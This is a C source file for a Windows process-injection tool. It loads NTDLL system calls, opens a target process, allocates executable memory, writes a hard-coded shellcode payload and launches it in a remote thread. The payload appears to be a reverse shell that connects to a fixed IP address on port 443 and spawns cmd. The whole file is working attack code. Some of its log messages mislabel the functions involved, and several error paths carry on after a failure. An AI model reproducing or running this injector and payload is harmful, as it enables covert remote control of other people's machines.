#include "resource.h"

/*-----------[GETMOD]-----------*/
HMODULE getMod(IN LPCWSTR modName) {

    HMODULE hModule = NULL;

    info("trying to get a handle to %S", modName);
    hModule = GetModuleHandleW(modName);

    if (hModule == NULL) {
        warn("failed to get a handle to the module. error: 0x%lx\n", GetLastError());
        return NULL;
    }

    else {
        okay("got a handle to the module!");
        info("\\___[ %S\n\t\\_0x%p]\n", modName, hModule);
        return hModule;
    }

}

int main(int argc, char* argv[]) {

    DWORD             PID = 0;
    NTSTATUS          STATUS = 0;
    PVOID             rBuffer = NULL;
    HANDLE            hProcess = NULL;
    HANDLE            hThread = NULL;
    HMODULE           hNTDLL = NULL;

    unsigned char rockyPayload[] =
        "\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
        "\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
        "\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"
        "\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
        "\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
        "\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"
        "\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40"
        "\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"
        "\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41"
        "\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1"
        "\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"
        "\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
        "\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"
        "\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"
        "\x12\xe9\x57\xff\xff\xff\x5d\x49\xbe\x77\x73\x32\x5f\x33"
        "\x32\x00\x00\x41\x56\x49\x89\xe6\x48\x81\xec\xa0\x01\x00"
        "\x00\x49\x89\xe5\x49\xbc\x02\x00\x01\xbb\xc0\xa8\x39\x06"
        "\x41\x54\x49\x89\xe4\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07"
        "\xff\xd5\x4c\x89\xea\x68\x01\x01\x00\x00\x59\x41\xba\x29"
        "\x80\x6b\x00\xff\xd5\x50\x50\x4d\x31\xc9\x4d\x31\xc0\x48"
        "\xff\xc0\x48\x89\xc2\x48\xff\xc0\x48\x89\xc1\x41\xba\xea"
        "\x0f\xdf\xe0\xff\xd5\x48\x89\xc7\x6a\x10\x41\x58\x4c\x89"
        "\xe2\x48\x89\xf9\x41\xba\x99\xa5\x74\x61\xff\xd5\x48\x81"
        "\xc4\x40\x02\x00\x00\x49\xb8\x63\x6d\x64\x00\x00\x00\x00"
        "\x00\x41\x50\x41\x50\x48\x89\xe2\x57\x57\x57\x4d\x31\xc0"
        "\x6a\x0d\x59\x41\x50\xe2\xfc\x66\xc7\x44\x24\x54\x01\x01"
        "\x48\x8d\x44\x24\x18\xc6\x00\x68\x48\x89\xe6\x56\x50\x41"
        "\x50\x41\x50\x41\x50\x49\xff\xc0\x41\x50\x49\xff\xc8\x4d"
        "\x89\xc1\x4c\x89\xc1\x41\xba\x79\xcc\x3f\x86\xff\xd5\x48"
        "\x31\xd2\x48\xff\xca\x8b\x0e\x41\xba\x08\x87\x1d\x60\xff"
        "\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd\x9d\xff\xd5"
        "\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb"
        "\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5";

    size_t            rockyPayloadSize = sizeof(rockyPayload);
    size_t            bytesWritten = 0;

    if (argc < 2) {
        warn("usage: %s <PID>", argv[0]);
        return EXIT_FAILURE;
    }

    PID = atoi(argv[1]);

    OBJECT_ATTRIBUTES OA = { sizeof(OA), NULL };
    CLIENT_ID         CID = { (HANDLE)PID, NULL };

    hNTDLL = getMod(L"NTDLL");
    if (hNTDLL == NULL) {
        warn("unable to get a handle to NTDLL, error: 0x%lx", GetLastError());
    }

    /*-----------[FUNC PROTOTYPES]-----------*/
    info("populating function prototypes");
    NtOpenProcess rockyOpenProcess = (NtOpenProcess)GetProcAddress(hNTDLL, "NtOpenProcess");
    okay("got NtOpenProcess!");
    info("\\___[ NtOpenProcess\n\t| rockyCreateThread\n\t|_0x%p]\n", rockyOpenProcess);
    NtAllocateVirtualMemory rockyAllocateVirtualMemory = (NtAllocateVirtualMemory)GetProcAddress(hNTDLL, "NtAllocateVirtualMemory");
    okay("got NtWriteVirtualMemory!");
    info("\\___[ NtAllocateVirtualMemory\n\t| rockyAllocateVirtualMemory\n\t|_0x%p]\n", rockyAllocateVirtualMemory);
    NtWriteVirtualMemory rockyWriteVirtualMemory = (NtWriteVirtualMemory)GetProcAddress(hNTDLL, "NtWriteVirtualMemory");
    okay("got NtWriteVirtualMemory!");
    info("\\___[ NtWriteVirtualMemory\n\t| kawWriteVirtualMemory\n\t|_0x%p]\n", rockyWriteVirtualMemory);
    NtCreateThreadEx rockyCreateThreadEx = (NtCreateThreadEx)GetProcAddress(hNTDLL, "NtCreateThreadEx");
    okay("got NtCreateThreadEx!");
    info("\\___[ NtCreateThreadEx\n\t| kawCreateThreadEx\n\t|_0x%p]\n", rockyCreateThreadEx);
    okay("all function prototypes filled!");

    /*-----------[INJECTION]-----------*/
    info("getting a handle to the process (%ld)", PID);
    STATUS = rockyOpenProcess(&hProcess, PROCESS_ALL_ACCESS, &OA, &CID);
    if (STATUS != STATUS_SUCCESS) {
        warn("failed to get a handle to the process, error: 0x%x", STATUS);
        return EXIT_FAILURE;
    }
    okay("got a handle to the process!");
    info("\\___[ hProcess\n\t\\_0x%p]\n", hProcess);

    STATUS = rockyAllocateVirtualMemory(hProcess, &rBuffer, NULL, &rockyPayloadSize, (MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE);
    if (STATUS != STATUS_SUCCESS) {
        warn("failed allocate buffer in process memory, error: 0x%x", STATUS);
    }
    okay("allocated a region of %zu-bytes with PAGE_EXECUTE_READWRITE permissions", rockyPayloadSize);

    STATUS = rockyWriteVirtualMemory(hProcess, rBuffer, rockyPayload, sizeof(rockyPayload), &bytesWritten);
    if (STATUS != STATUS_SUCCESS) {
        warn("failed to write to allocated buffer, error: 0x%x", STATUS);
        CloseHandle(hProcess);

    }
    okay("wrote %zu-bytes to allocated buffer", bytesWritten);

    STATUS = rockyCreateThreadEx(&hThread, THREAD_ALL_ACCESS, &OA, hProcess, (PTHREAD_START_ROUTINE)rBuffer, NULL, 0, 0, 0, 0, NULL);
    if (STATUS != STATUS_SUCCESS) {
        warn("failed to create new thread, error: 0x%x", STATUS);

    }
    okay("got a handle to the thread!");
    info("\\___[ hThread\n\t\\_0x%p]\n", hThread);

    info("waiting for thread to finish...");
    WaitForSingleObject(hThread, INFINITE);
    okay("thread finished execution!");

    info("cleaning up now");
    CloseHandle(hThread);
    CloseHandle(hProcess);


    okay("finished with the cleanup, exiting now. goodbye :>");
    return EXIT_SUCCESS;

}
